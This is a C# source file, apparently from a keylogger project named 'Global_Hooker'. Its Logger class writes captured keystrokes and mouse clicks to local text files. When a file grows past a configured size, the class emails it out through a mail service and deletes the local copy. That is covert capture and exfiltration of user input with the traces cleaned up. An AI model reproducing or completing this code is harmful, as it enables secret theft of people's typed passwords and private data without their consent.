using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace Global_Hooker
{
    class Logger
    {
        private readonly ConfigurationManager _configuration;
        private static string _clickLog = "clickLog.txt";
        private static string _keyLog = "keyLog.txt";

        public Logger()
        {
           _configuration = ConfigurationManager.Instance;
        }

        public void LogKey(string message)
        {
            using (StreamWriter writer = new StreamWriter(_keyLog, true))
            {
                writer.WriteLine(message);
            }
            CheckFileSize(_keyLog);
        }

        public void LogClick(string message)
        {
            using (StreamWriter writer = new StreamWriter(_clickLog, true))
            {
                writer.WriteLine(message);
            }
            CheckFileSize(_clickLog);
        }

        private void CheckFileSize(string filePath)
        {
            if (new FileInfo(filePath).Length > _configuration.MaxFileSize)
            {
                new MailService().SendMail(filePath);
                new FileInfo(filePath).Delete();
            }
        }
    }
}